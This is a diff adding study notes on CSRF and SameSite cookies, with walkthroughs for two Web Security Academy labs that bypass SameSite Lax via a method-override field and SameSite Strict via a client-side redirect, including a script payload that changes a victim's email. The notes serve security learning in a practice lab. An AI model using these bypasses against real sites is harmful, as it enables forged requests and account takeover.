@@ -71,3 +71,36 @@ Common defences against CSRF:-
     5. Copy POC and send to exploit server & send exploit and lab is solved
 
 ---------------------------------------------------------------------------------------------------------
+Strict:-
+
+If a cookie is set with the SameSite=Strict attribute, browsers will not send it in any cross-site requests. 
+In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, 
+it will not include the cookie.
+
+Lax:-
+
+Lax SameSite restrictions mean that browsers will send the cookie in cross-site requests, 
+    but only if both of the following conditions are met:
+
+    a)The request uses the GET method.
+    b)The request resulted from a top-level navigation by the user, such as clicking on a link.
+
+#7 Lab: SameSite Lax bypass via method override
+
+    1. Login as wiener and send /change-email to repeater
+    2. IN csrf poc  add  <input type="hidden" name="_method" value="POST"> above email line and change email to any random email
+    3. Generate CSRF POC and copy and send to exploit server & send exploit and lab is solved
+
+----------------------------------------------------------------------------------------------------------
+
+#8 Lab: SameSite Strict bypass via client-side redirect
+
+    1. In lab-url try appending /post/comment/confirmation?postId=../my-account/ and see whether it's redirecting to my-account page or not
+    2. Then in another payload change the email and enter the payload  /post/comment/confirmation?postId=../my-account/change-email?email=wiener%40abnormal-user.net%26submit=1
+    3. Then in exploit server send the payload given below
+       <script>
+       window.location = "https://0ae000f904a4e658807153570087005f.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=wiener%40abnormal-user.net%26submit=1";
+       </script>
+    4. Then send the exploit and lab is solved
+
+----------------------------------------------------------------------------------------------------------
